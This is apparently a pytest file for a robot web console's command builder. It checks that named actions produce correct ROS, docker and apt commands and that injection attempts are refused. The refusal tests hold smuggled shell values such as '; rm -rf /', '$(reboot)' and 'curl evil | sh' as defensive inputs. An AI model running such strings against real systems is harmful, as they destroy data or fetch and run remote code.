"""The named actions build the right command and refuse unsafe arguments.

The point of the module is that the browser can no longer put shell text on the
wire: it names an action and sends data, and the server builds the command. So
the tests that matter are (1) the command comes out shaped right, and (2) an
argument carrying shell metacharacters is rejected, not quoted-and-run.
"""
import os
import sys

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "web", "backend"))

import actions  # noqa: E402


def test_agent_start_native_serial():
    cmd = actions.build("agent_start", {"engine": "native", "transport": "serial",
                                        "device": "/dev/ttyUSB0", "baud": 921600, "distro": "jazzy"})
    assert "micro_ros_agent serial --dev /dev/ttyUSB0 -b 921600" in cmd
    assert "source" in cmd  # ROS sourcing prepended


def test_agent_start_udp_has_no_device():
    cmd = actions.build("agent_start", {"engine": "native", "transport": "udp4", "port": 8888})
    assert "udp4 -p 8888" in cmd
    assert "--dev" not in cmd


def test_bringup_passes_through_launch_args():
    cmd = actions.build("bringup", {"launcher": "/w/launch_bringup.py", "config_path": "/c/robot.yaml",
                                    "base": "mecanum", "device": "/dev/ttyACM0", "baud": 1500000,
                                    "madgwick": True, "micro_ros": False, "distro": "jazzy"})
    assert "ros2 launch /w/launch_bringup.py" in cmd
    assert "base:=mecanum" in cmd and "madgwick:=true" in cmd and "micro_ros:=false" in cmd


def test_teleop_writes_params_and_runs():
    cmd = actions.build("teleop", {"axis_linear": 1, "scale_linear": 0.5,
                                   "axis_angular": 0, "scale_angular": 1.0})
    assert "teleop_twist_joy_node" in cmd and "joy_linux_node" in cmd


def test_map_save_name_is_an_identifier():
    cmd = actions.build("map_save", {"name": "kitchen", "maps_dir": "/w/maps"})
    assert "map_saver_cli -f /w/maps/kitchen" in cmd


def test_apt_install_quotes_a_package_list():
    cmd = actions.build("apt_install", {"packages": "ros-jazzy-slam-toolbox ros-jazzy-nav2-bringup"})
    assert "apt-get install -y ros-jazzy-slam-toolbox ros-jazzy-nav2-bringup" in cmd


def test_unknown_action_raises():
    with pytest.raises(ValueError):
        actions.build("rm_rf_slash", {})


@pytest.mark.parametrize("bad", [
    {"device": "/dev/ttyUSB0; rm -rf /"},
    {"device": "/dev/tty$(reboot)"},
    {"device": "/dev/tty\nreboot"},
])
def test_shell_metacharacters_in_device_are_refused(bad):
    args = {"engine": "native", "transport": "serial", "baud": 921600}
    args.update(bad)
    with pytest.raises(ValueError):
        actions.build("agent_start", args)


def test_a_bad_map_name_is_refused_not_quoted():
    with pytest.raises(ValueError):
        actions.build("map_save", {"name": "x; reboot", "maps_dir": "/w/maps"})


def test_apt_rejects_a_non_package_token():
    with pytest.raises(ValueError):
        actions.build("apt_install", {"packages": "good-pkg; curl evil | sh"})


def test_prepared_handles_are_one_shot():
    h = actions.prepare("echo hello")
    assert actions.claim(h) == "echo hello"
    assert actions.claim(h) is None
    assert actions.claim("bogus") is None


def test_nav2_has_three_branches_when_params_given():
    cmd = actions.build("nav2", {"launcher": "/w/launch_nav2.py", "distro": "jazzy",
                                 "map": "/m/kitchen.yaml", "params_file": "",
                                 "default_params": "/w/console_nav2_jazzy.yaml", "depth": False})
    assert "ros2 launch /w/launch_nav2.py" in cmd
    assert "nav2_bringup bringup_launch.py" in cmd     # middle branch present
    assert "linorobot2_navigation navigation.launch.py" in cmd
    assert "map:=/m/kitchen.yaml" in cmd


def test_laser_driver_serial():
    cmd = actions.build("laser_driver", {"is_ld": True, "mode": "serial", "product": "LDLiDAR_LD19",
                                         "bins": 456, "port": "/dev/ttyUSB0", "baud": 230400})
    assert "ldlidar_stl_ros2_node --ros-args" in cmd
    assert "-p comm_mode:=serial" in cmd and "-p port_name:=/dev/ttyUSB0" in cmd


def test_laser_driver_udp_bridge_reclaims_pty_without_pkill_f():
    cmd = actions.build("laser_driver", {"is_ld": True, "mode": "udp_bridge", "bins": 456,
                                         "udp_port": 8889, "bridge_path": "/dev/lidar_udp_bridge"})
    assert "socat" in cmd
    assert "pkill -f" not in cmd            # AGENTS.md Rule 1 -- fixed in the port
    assert "[s]ocat" in cmd                 # bracketed pgrep instead


def test_laser_driver_non_ld_uses_lasers_launch():
    cmd = actions.build("laser_driver", {"is_ld": False, "code": "rplidar_a1", "distro": "jazzy"})
    assert "lasers.launch.py sensor:=rplidar_a1" in cmd


def test_rviz_novnc_never_uses_pkill():
    cmd = actions.build("rviz_novnc", {"display": ":99", "novnc_port": 6080})
    assert "pkill" not in cmd and "Xvfb :99" in cmd


def test_docker_down_builds_compose():
    cmd = actions.build("docker_down", {"engine": "docker", "docker_dir": "/w/docker"})
    assert 'COMPOSE="docker compose"' in cmd and "cd /w/docker" in cmd and "down" in cmd


def test_docker_build_assembles_env_and_compose():
    cmd = actions.build("docker_build", {"distro": "jazzy", "base_image": "linorobot2:jazzy",
                                         "robot_base": "2wd", "serial_port": "/dev/ttyACM0",
                                         "workspace": "/w", "docker_dir": "/w/docker",
                                         "robot_name": "robbie", "engine": "docker"})
    assert "git clone" in cmd and "linorobot2" in cmd
    assert "cat > /w/docker/.env" in cmd and "ROBOT_NAME=robbie" in cmd
    assert "$COMPOSE" in cmd and "build" in cmd


def test_docker_build_rejects_a_bad_robot_name():
    with pytest.raises(ValueError):
        actions.build("docker_build", {"base_image": "img", "robot_name": "a; rm -rf /",
                                       "workspace": "/w", "docker_dir": "/w/d"})
